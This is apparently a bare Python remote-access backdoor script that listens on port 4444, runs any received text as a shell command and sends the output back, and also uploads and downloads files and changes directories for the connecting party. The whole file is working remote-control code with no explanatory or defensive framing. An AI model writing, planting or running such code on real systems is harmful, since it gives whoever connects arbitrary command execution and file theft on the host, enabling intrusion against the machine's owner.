import socket
import threading
import sys
import subprocess
import json
from os import chdir

sock = socket.socket()
sock.bind(('127.0.0.1',4444))
sock.listen()

def data_recv():
    data = ''
    while True:
        try:
            data = data + conn.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def data_send(data):
    jsondata = json.dumps(data)
    conn.send(jsondata.encode())

def upload_file(file):
    f = open(file, 'rb')
    conn.send(f.read())

def download_file(file):
    f = open(file, 'wb')
    conn.settimeout(5)
    chunk = conn.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = conn.recv(1024)
        except socket.timeout as e:
            break
    conn.settimeout(None)
    f.close()

def handle_clientes():
    
    while True:
        msg = data_recv()
        print(msg)
        if msg == 'exit':
            print('aaa')
            sys.exit()
        elif msg[:6] == 'upload':
         try:
           download_file(msg[7:])
         except:
             pass
        elif msg[:8] == 'download':
         try:
            upload_file(msg[9:])
         except:
            pass
        elif msg[:3] == 'cd ':
         try:
           chdir(msg[3:])
         except:
            pass
        else:
            exe = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            rcomm = exe.stdout.read() + exe.stderr.read()
            rcomm = rcomm.decode()
            data_send(rcomm)

while True:
    print('listen...')
    conn,addr = sock.accept()
    print(f'Connection recived by {addr}')
    thread = threading.Thread(target=handle_clientes)
    thread.start()